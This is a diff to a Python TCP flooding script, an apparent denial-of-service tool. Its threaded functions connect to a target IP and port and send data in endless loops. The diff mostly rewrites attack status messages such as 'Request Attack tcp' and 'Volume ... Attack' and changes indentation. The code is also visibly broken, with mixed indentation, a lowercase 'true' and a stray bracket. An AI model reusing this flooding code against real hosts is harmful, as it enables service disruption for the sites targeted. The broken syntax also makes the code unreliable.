@@ -85,15 +85,15 @@ def run2():
 	i = random.choice(("[+]"))
 	while true:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
+		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		        s.connect((ip,port))
+		        s.send(data)
+		        for x in range(times):
 				s.send(data)
-			print("\033[91m[+\033[91m] \033[33mה-TCP שלך מאוים \033[0m "),
+                        print(i + "\033[32mRequest Attack tcp \033[0m")
 		except:
-			s.close()
-			print("[*] Error!!!")
+		        s.close()
+		        print("[-] \033[31mError!!!\033[0m")
             
 
 def run3():
@@ -106,10 +106,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + " \033[95mSending Massage\033[0m")
 		except:
 			s.close()
-			print("[-] Error!!!")
+			print("[-] \033[31mMaybe down...!\033[0m")
             
   
 def run4():
@@ -122,13 +122,12 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
 		except:
 			s.close()
-			print("[-] Error!!!")
+			print("[-] \033[31mError!!!\033[0m"])
 
 
-											
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -140,3 +139,5 @@ for y in range(threads):
 else:
 		th = threading.Thread(target = run4)
 		th.start()
+
+
